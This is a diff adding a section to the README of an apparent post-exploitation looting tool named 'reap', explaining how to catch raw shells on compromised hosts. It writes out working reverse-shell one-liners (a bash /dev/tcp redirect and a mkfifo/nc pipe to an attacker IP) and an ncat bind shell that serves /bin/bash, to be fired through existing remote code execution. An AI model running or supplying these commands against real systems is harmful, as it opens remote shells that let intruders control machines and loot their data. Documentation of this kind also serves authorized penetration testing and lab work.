@@ -84,6 +84,38 @@ For a nologin web user such as `www-data`, the `webshell` adapter loots the host
 
 Raw shells are driven with sentinel-wrapped commands over the socket (no PTY, so no interactive prompts). reap only runs commands that return, so collection works fine; for stability-sensitive work, upgrade to SSH. Add `--shell cmd` for a Windows `cmd.exe` shell.
 
+### Catching a raw shell
+
+reap can be the listener itself — you don't need a separate `nc`. Register the listener *first*, then fire your reverse-shell payload from the target through whatever RCE you have:
+
+```
+reap> register listen 4444
+  listening on 0.0.0.0:4444 — fire your reverse shell now...
+```
+
+Then, on the target (`10.10.14.5` is *your* attacking/VPN IP, `4444` the port you're listening on):
+
+```bash
+# Linux, /dev/tcp (bash):
+bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
+# Linux, no /dev/tcp:
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
+```
+
+reap catches the connection, auto-fingerprints it, and you `run` as usual — it loots over the caught shell.
+
+For a **bind** shell (the target listens, reap dials in):
+
+```bash
+# on the target, e.g. via your RCE:
+ncat -lvp 1337 -e /bin/bash          # or the exploit itself opens the port
+```
+```
+reap> register bind 10.10.10.5 1337
+```
+
+Windows `cmd.exe` reverse/bind shell: add `--shell cmd` (e.g. `register listen 4444 --shell cmd`).
+
 ## Commands
 
 | command | description |
